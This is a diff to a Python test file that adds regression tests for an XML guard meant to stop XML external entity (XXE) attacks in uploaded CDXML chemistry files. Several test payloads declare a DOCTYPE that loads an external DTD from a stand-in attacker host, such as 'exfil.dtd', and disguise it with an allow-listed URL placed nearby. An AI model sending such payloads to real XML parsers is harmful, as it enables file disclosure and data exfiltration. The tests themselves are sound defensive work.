@@ -18,7 +18,6 @@ from app.errors import FormatDetectionError
 from app.services.format_detector import detect_format
 from app.services.xml_guard import reject_xml_external_entities
 
-
 BENIGN_CDXML = (
     b'<?xml version="1.0"?>\n'
     b"<CDXML><page><fragment>C</fragment></page></CDXML>"
@@ -209,6 +208,109 @@ def test_attacker_spoofed_cdxml_filename_rejected() -> None:
     )
     with pytest.raises(FormatDetectionError):
         reject_xml_external_entities(payload)
+
+
+# ---------------------------------------------------------------------------
+# Substring-allow-list bypass cases — the DOCTYPE has an attacker-controlled
+# SYSTEM/PUBLIC id while an allow-listed URL appears nearby (comment,
+# attribute, processing instruction, URL suffix). A substring-based check
+# would accept these; structural extraction must reject them.
+# ---------------------------------------------------------------------------
+
+
+def test_allowed_url_in_comment_after_evil_doctype_rejected() -> None:
+    payload = (
+        b'<?xml version="1.0"?>\n'
+        b'<!DOCTYPE CDXML SYSTEM "http://attacker.example.com/exfil.dtd">\n'
+        b'<!-- http://www.cambridgesoft.com/xml/cdxml.dtd -->\n'
+        b"<CDXML/>"
+    )
+    with pytest.raises(FormatDetectionError):
+        reject_xml_external_entities(payload)
+
+
+def test_allowed_url_as_suffix_of_attacker_url_rejected() -> None:
+    payload = (
+        b'<?xml version="1.0"?>\n'
+        b'<!DOCTYPE CDXML SYSTEM '
+        b'"http://attacker.example.com/spoof-http://www.cambridgesoft.com/xml/cdxml.dtd">\n'
+        b"<CDXML/>"
+    )
+    with pytest.raises(FormatDetectionError):
+        reject_xml_external_entities(payload)
+
+
+def test_allowed_url_in_attribute_after_evil_doctype_rejected() -> None:
+    payload = (
+        b'<?xml version="1.0"?>\n'
+        b'<!DOCTYPE CDXML SYSTEM "http://attacker.example.com/exfil.dtd">\n'
+        b'<CDXML ref="http://www.cambridgesoft.com/xml/cdxml.dtd"/>'
+    )
+    with pytest.raises(FormatDetectionError):
+        reject_xml_external_entities(payload)
+
+
+def test_allowed_url_in_processing_instruction_after_evil_doctype_rejected() -> None:
+    payload = (
+        b'<?xml version="1.0"?>\n'
+        b'<!DOCTYPE CDXML SYSTEM "http://attacker.example.com/exfil.dtd">\n'
+        b'<?foo http://www.cambridgesoft.com/xml/cdxml.dtd ?>\n'
+        b"<CDXML/>"
+    )
+    with pytest.raises(FormatDetectionError):
+        reject_xml_external_entities(payload)
+
+
+def test_public_id_with_allowed_url_in_comment_rejected() -> None:
+    payload = (
+        b'<?xml version="1.0"?>\n'
+        b'<!DOCTYPE CDXML PUBLIC "-//Attacker//DTD//EN" '
+        b'"http://attacker.example.com/evil.dtd">\n'
+        b"<!-- http://www.cambridgesoft.com/xml/cdxml.dtd -->\n"
+        b"<CDXML/>"
+    )
+    with pytest.raises(FormatDetectionError):
+        reject_xml_external_entities(payload)
+
+
+def test_doctype_with_internal_subset_but_no_entity_rejected() -> None:
+    """Real ChemDraw CDXML never uses an internal subset. Reject any
+    DOCTYPE containing ``[`` even without a visible ``<!ENTITY>`` — an
+    external DTD fetched via a parameter entity inside the subset could
+    still trigger XXE."""
+    payload = (
+        b'<?xml version="1.0"?>\n'
+        b'<!DOCTYPE CDXML [ <!-- benign-looking comment --> ]>\n'
+        b"<CDXML/>"
+    )
+    with pytest.raises(FormatDetectionError):
+        reject_xml_external_entities(payload)
+
+
+def test_unterminated_doctype_rejected() -> None:
+    """A DOCTYPE whose closing ``>`` is missing within the scan window must
+    be rejected rather than silently truncated."""
+    payload = (
+        b'<?xml version="1.0"?>\n'
+        b'<!DOCTYPE CDXML SYSTEM "http://attacker.example.com/evil.dtd"'
+        + b" " * 2_100
+        + b"\n<CDXML/>"
+    )
+    with pytest.raises(FormatDetectionError):
+        reject_xml_external_entities(payload)
+
+
+def test_mixed_quotes_allowed_revvity_dtd_accepted() -> None:
+    """Single-quoted SYSTEM literal pointing at the catalogued URL must
+    remain accepted — structural parsing has to handle either quote style."""
+    payload = (
+        b"<?xml version='1.0' encoding='UTF-8'?>\n"
+        b"<!DOCTYPE CDXML SYSTEM "
+        b"'https://static.chemistry.revvitycloud.com/cdxml/CDXML.dtd'>\n"
+        b"<CDXML><page><fragment>C</fragment></page></CDXML>"
+    )
+    reject_xml_external_entities(payload)
+    assert detect_format(payload) == "cdxml"
 
 
 # ---------------------------------------------------------------------------
